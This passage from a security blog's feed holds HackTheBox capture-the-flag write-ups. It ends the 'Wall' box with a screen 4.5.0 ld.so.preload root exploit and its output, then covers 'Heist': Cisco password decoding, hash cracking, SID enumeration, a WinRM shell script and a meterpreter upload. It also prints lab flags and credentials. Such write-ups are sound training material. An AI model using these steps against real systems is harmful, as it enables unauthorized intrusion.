&lt;span class="code-line"&gt;ls&lt;/span&gt;
&lt;span class="code-line"&gt;libhax.c&lt;/span&gt;
&lt;span class="code-line"&gt;rootshell.c&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/tmp/ioio$ gcc -fPIC -shared -ldl -o /tmp/ioio/libhax.so /tmp/ioio/libhax.c&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/tmp/ioio$ gcc -o /tmp/ioio/rootshell /tmp/ioio/rootshell.c&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/tmp/ioio$ cd /etc&lt;/span&gt;
&lt;span class="code-line"&gt;cd /etc&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/etc$ umask 000&lt;/span&gt;
&lt;span class="code-line"&gt;umask 000&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/etc$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  &amp;quot;\x0a/tmp/ioio/libhax.so&amp;quot; &lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt; ld.so.preload echo -ne  &amp;quot;\x0a/tmp/ioio/libhax.so&amp;quot; &lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/etc$ /bin/screen-4.5.0 -ls&lt;/span&gt;
&lt;span class="code-line"&gt;/bin/screen-4.5.0 -ls&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.&lt;/span&gt;
&lt;span class="code-line"&gt;[+] done!&lt;/span&gt;
&lt;span class="code-line"&gt;No Sockets found in /tmp/screens/S-www-data.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@Wall:/etc$ /tmp/ioio/rootshell&lt;/span&gt;
&lt;span class="code-line"&gt;/tmp/ioio/rootshell&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got a root shell, we get the root flag and then the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;1fdbcf8c33eaa2599afdc52e1b4d5db7&lt;/span&gt;
&lt;span class="code-line"&gt;ls /hom/e&lt;/span&gt;
&lt;span class="code-line"&gt;ls: cannot access &amp;#39;/hom/e&amp;#39;: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;ls /hom/e&lt;/span&gt;
&lt;span class="code-line"&gt;ls: cannot access &amp;#39;/hom/e&amp;#39;: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;shelby&lt;/span&gt;
&lt;span class="code-line"&gt;sysmonitor&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/shelby/&lt;/span&gt;
&lt;span class="code-line"&gt;html.zip&lt;/span&gt;
&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/shelby/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;fe6194544f452f62dc905b12f8da8406&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was a pain. This is the first box where a bruteforce is needed. This
lead to high instability of the box on public servers. The blocked characters on
the centreon payload complicate a lot the use of the CVE-2019-13024 exploit.&lt;/p&gt;
&lt;p&gt;The root part is quit easy in comparison and interesting to use.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit: The more I think about this box the more I find it realistic. In fact,
web applications should have some protection agains brute force attacks and
have some WAF blocking characters (at least a mod security).&lt;/em&gt;
content/2020.01_craft.md:meta:security&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="bruteforce"></category><category term="centreon"></category><category term="WAF"></category><category term="bypass"></category><category term="SUID"></category><category term="screen"></category><category term="linux"></category></entry><entry><title>HTB: Heist</title><link href="https://maggick.fr/2019/12/htb-heist.html" rel="alternate"></link><published>2019-12-01T17:35:00+01:00</published><updated>2019-12-01T17:35:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-12-01:/2019/12/htb-heist.html</id><summary type="html">&lt;p&gt;&lt;img alt="Heist card" class="align-left" src="/media/2019.12/heist_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/201"&gt;Heist&lt;/a&gt;
This box is classified as an easy machine.
It implies some CISCO router configuration, a MS Windows server with a WinRM
service, a meterpreter, a tentative of Lazagne and procdump.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.12/heist_card.png" alt="Heist card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/201"&gt;Heist&lt;/a&gt;
This box is classified as an easy machine.
It implies some CISCO router configuration, a MS Windows server with a WinRM
service, a meterpreter, a tentative of Lazagne and procdump.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#port-80-http"&gt;port 80: HTTP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#port-135-msrpc"&gt;port 135: MSRPC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#port-445-smb"&gt;Port 445: SMB&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#port-5985-winrm"&gt;Port 5985: WinRM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#port-49669-msrpc"&gt;Port 49669: MSRPC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#web"&gt;Web&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#lazagne"&gt;Lazagne&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#procdump"&gt;procdump&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Wed Nov  6 15:29:09 2019 as: nmap -p- -sSV -oA nmap 10.10.10.149&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.149&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.23s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65530 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http          Microsoft IIS httpd 10.0&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Nov  6 15:34:10 2019 -- 1 IP address (1 host up) scanned in 301.46 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="port-80-http"&gt;port 80: HTTP&lt;/h2&gt;
&lt;p&gt;This port is the web service.&lt;/p&gt;
&lt;h2 id="port-135-msrpc"&gt;port 135: MSRPC&lt;/h2&gt;
&lt;h2 id="port-445-smb"&gt;Port 445: SMB&lt;/h2&gt;
&lt;p&gt;This port is for SMB.&lt;/p&gt;
&lt;h2 id="port-5985-winrm"&gt;Port 5985: WinRM&lt;/h2&gt;
&lt;p&gt;This port is used by the WinRM service&lt;/p&gt;
&lt;h2 id="port-49669-msrpc"&gt;Port 49669: MSRPC&lt;/h2&gt;
&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;p&gt;We found an authentication page with an option to login as a guest.
Then we see a conversation between an user and the support about a CISCO router
configuration.&lt;/p&gt;
&lt;p&gt;&lt;img alt="configuration cisco" src="/media/2019.12/heist_1.png"&gt;&lt;/p&gt;
&lt;p&gt;The router configuration is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;version 12.2&lt;/span&gt;
&lt;span class="code-line"&gt;no service pad&lt;/span&gt;
&lt;span class="code-line"&gt;service password-encryption&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;isdn switch-type basic-5ess&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;hostname ios-1&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;security passwords min-length 12&lt;/span&gt;
&lt;span class="code-line"&gt;enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;username rout3r password 7 0242114B0E143F015F5D1E161713&lt;/span&gt;
&lt;span class="code-line"&gt;username admin privilege 15 password 7 02375012182C1A1D751618034F36415408&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;ip ssh authentication-retries 5&lt;/span&gt;
&lt;span class="code-line"&gt;ip ssh version 2&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;router bgp 100&lt;/span&gt;
&lt;span class="code-line"&gt;synchronization&lt;/span&gt;
&lt;span class="code-line"&gt;bgp log-neighbor-changes&lt;/span&gt;
&lt;span class="code-line"&gt;bgp dampening&lt;/span&gt;
&lt;span class="code-line"&gt;network 192.168.0.0Â mask 300.255.255.0&lt;/span&gt;
&lt;span class="code-line"&gt;timers bgp 3 9&lt;/span&gt;
&lt;span class="code-line"&gt;redistribute connected&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;ip classless&lt;/span&gt;
&lt;span class="code-line"&gt;ip route 0.0.0.0 0.0.0.0 192.168.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;access-list 101 permit ip any any&lt;/span&gt;
&lt;span class="code-line"&gt;dialer-list 1 protocol ip list 101&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;no ip http server&lt;/span&gt;
&lt;span class="code-line"&gt;no ip http secure-server&lt;/span&gt;
&lt;span class="code-line"&gt;!&lt;/span&gt;
&lt;span class="code-line"&gt;line vty 0 4&lt;/span&gt;
&lt;span class="code-line"&gt;session-timeout 600&lt;/span&gt;
&lt;span class="code-line"&gt;authorization exec SSH&lt;/span&gt;
&lt;span class="code-line"&gt;transport input ssh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;a href="https://github.com/theevilbit/ciscot7"&gt;a cisco type 7 decrypter&lt;/a&gt; to get
the &lt;code&gt;rout3r&lt;/code&gt; and &lt;code&gt;admin&lt;/code&gt; passwords.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python ciscot7.py -d -p 0242114B0E143F015F5D1E161713&lt;/span&gt;
&lt;span class="code-line"&gt;Decrypted password: $uperP@ssword&lt;/span&gt;
&lt;span class="code-line"&gt;python ciscot7.py -d -p 02375012182C1A1D751618034F36415408&lt;/span&gt;
&lt;span class="code-line"&gt;Decrypted password: Q4)sJu\Y8qz*A3?d&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;For the hashed password we use john with rockyou:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;stealth1agent    (?)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We now have three potential users as well as three potential passwords. The
users:
  1. admin
  2. rout3r
  3. Hazard&lt;/p&gt;
&lt;p&gt;The passwords:
  1. &lt;code&gt;$uperP@ssword&lt;/code&gt;
  2. &lt;code&gt;Q4)sJu\Y8qz*A3?d&lt;/code&gt;
  3. &lt;code&gt;stealth1agent&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We want to connect using the WinRM service. We can use
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil winrm&lt;/a&gt; as well as a simple
ruby script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;require&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;WinRM&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;endpoint&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.149:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;user&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rout3r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Q4)sJu\Y8qz*A3?d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:powershell&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;exit&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PS &amp;gt; &amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;gets&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDOUT&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDERR&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Exiting with code &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exitcode&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Trying all the possible combination won't give up a shell. We need more
enumeration. We launch
&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's lookupsid&lt;/a&gt; using the
different user/password combinations. One is working with the Hazard user and
the &lt;code&gt;stealth1agent&lt;/code&gt; password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python lookupsid.py Hazard:stealth1agent@10.10.10.149&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Brute forcing SIDs at 10.10.10.149&lt;/span&gt;
&lt;span class="code-line"&gt;[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112&lt;/span&gt;
&lt;span class="code-line"&gt;500: SUPPORTDESK\Administrator (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;501: SUPPORTDESK\Guest (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;503: SUPPORTDESK\DefaultAccount (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;513: SUPPORTDESK\None (SidTypeGroup)&lt;/span&gt;
&lt;span class="code-line"&gt;1008: SUPPORTDESK\Hazard (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;1009: SUPPORTDESK\support (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;1012: SUPPORTDESK\Chase (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;1013: SUPPORTDESK\Jason (SidTypeUser)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We have more users now! We can eliminate the &lt;code&gt;stealth1agent&lt;/code&gt; password as this is
Hazard's password.
A few combination later using winrm, we discover that the user Chase use the
&lt;code&gt;Q4)sJu\Y8qz*A3?d&lt;/code&gt; password. We have a shell and the user flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby winrm.rb&lt;/span&gt;
&lt;span class="code-line"&gt;PS &amp;gt; whoami&lt;/span&gt;
&lt;span class="code-line"&gt;supportdesk\chase&lt;/span&gt;
&lt;span class="code-line"&gt;PS &amp;gt; dir ../Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    Directory: C:\Users\Chase\Desktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
&lt;span class="code-line"&gt;-a----        4/22/2019   9:08 AM            121 todo.txt&lt;/span&gt;
&lt;span class="code-line"&gt;-a----        4/22/2019   9:07 AM             32 user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS &amp;gt; type ../Desktop/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a127d&amp;lt;redacted&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PS &amp;gt; type ../Desktop/todo.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Stuff to-do:&lt;/span&gt;
&lt;span class="code-line"&gt;1. Keep checking the issues list.&lt;/span&gt;
&lt;span class="code-line"&gt;2. Fix the router config.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Done:&lt;/span&gt;
&lt;span class="code-line"&gt;1. Restricted access for guest user.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can upload a meterpreter (generated with msfvenom) using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil winrm&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;evil-winrm  -i 10.10.10.149 -u ^Case -p &amp;#39;Q4)sJu\Y8qz*A3?d&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The meterpreter allow us to easy enumerate the box. Let us take a look at the
running process:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; ps&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Process List&lt;/span&gt;
&lt;span class="code-line"&gt;============&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PID   PPID  Name                     Arch  Session  User               Path&lt;/span&gt;
&lt;span class="code-line"&gt;---   ----  ----                     ----  -------  ----               ----&lt;/span&gt;
&lt;span class="code-line"&gt;0     0     [System Process]                                           &lt;/span&gt;
&lt;span class="code-line"&gt;4     0     System                                                     &lt;/span&gt;
&lt;span class="code-line"&gt;104   4     Registry                                                   &lt;/span&gt;
&lt;span class="code-line"&gt;268   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;300   4     smss.exe                                                   &lt;/span&gt;
&lt;span class="code-line"&gt;340   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;404   396   csrss.exe                                                  &lt;/span&gt;
&lt;span class="code-line"&gt;408   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;480   396   wininit.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;488   472   csrss.exe                                                  &lt;/span&gt;
&lt;span class="code-line"&gt;544   472   winlogon.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;612   480   services.exe                                               &lt;/span&gt;
&lt;span class="code-line"&gt;632   480   lsass.exe                                                  &lt;/span&gt;
&lt;span class="code-line"&gt;652   792   dllhost.exe              x64   1        SUPPORTDESK\Chase  C:\Windows\System32\dllhost.exe&lt;/span&gt;
&lt;span class="code-line"&gt;684   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;764   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;784   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;792   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;812   544   fontdrvhost.exe                                            &lt;/span&gt;
&lt;span class="code-line"&gt;820   480   fontdrvhost.exe                                            &lt;/span&gt;
&lt;span class="code-line"&gt;904   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;956   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;984   612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1020  544   dwm.exe                                                    &lt;/span&gt;
&lt;span class="code-line"&gt;1052  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1128  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1164  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1184  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1248  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1300  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1348  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1356  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1364  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1376  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1468  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1512  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1580  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1624  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1632  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1720  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1780  1468  taskhostw.exe                                              &lt;/span&gt;
&lt;span class="code-line"&gt;1820  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1896  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1968  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;1992  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2216  612   svchost.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2564  612   spoolsv.exe                                                &lt;/span&gt;
&lt;span class="code-line"&gt;2624  612   svchost.exe                                                &lt;/span&gt;
